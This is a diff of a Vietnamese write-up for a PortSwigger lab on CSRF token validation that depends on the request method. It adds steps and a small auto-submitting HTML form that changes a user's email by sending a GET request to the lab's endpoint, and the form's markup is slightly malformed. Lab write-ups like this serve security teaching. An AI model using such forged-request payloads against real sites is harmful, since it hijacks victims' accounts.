@@ -53,14 +53,36 @@ Ta sẽ đi sâu vấn đề hơn và làm bài lab của từng phần:
 ### [1. CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)
 
 Bài lab này mô phỏng việc website xác thực csrf token phục thuộc vào phương thức yêu cầu: 
+Đầu tiên ta vào phần đăng nhập với mục đích bắt request của thay đổi email:
 
 ![image](https://user-images.githubusercontent.com/104350480/224540812-bd860831-cc62-4f9c-a601-396ab6872366.png)
 
+Ở phương thức POST có csrf token đi kèm:
+
 ![image](https://user-images.githubusercontent.com/104350480/224540814-63ecccda-fe77-4ff2-877a-8a1f2dc0c11e.png)
+
+Bỏ đi thì sẽ báo lỗi là rõ:
 
 ![image](https://user-images.githubusercontent.com/104350480/224540815-5ce6caf3-f646-4952-8451-7710a96485be.png)
 
+Mà bài này thì chuyển về phương thức GET lại không: 
+
 ![image](https://user-images.githubusercontent.com/104350480/224540823-03d251b0-c4b5-4c5e-ac72-d13dbb1f39bd.png)
+
+Viết form đơn giản gửi qua phần exploit: 
 
 ![image](https://user-images.githubusercontent.com/104350480/224540834-1e3e83b1-b324-42a2-b82e-2310600e2213.png)
 
+```
+<form id='csrf' action='https://0ac90074044080ffc16121c5000c0026.web-security-academy.net/my-account/change-email' method='GET'>
+<input type='hidden' name='email' value='manhhuy08112002@gmailcom'>
+<input type='submit'
+</form/>
+<script>
+document.getElementById('csrf').submit();
+
+</script>
+
+```
+
+### [2. ]()
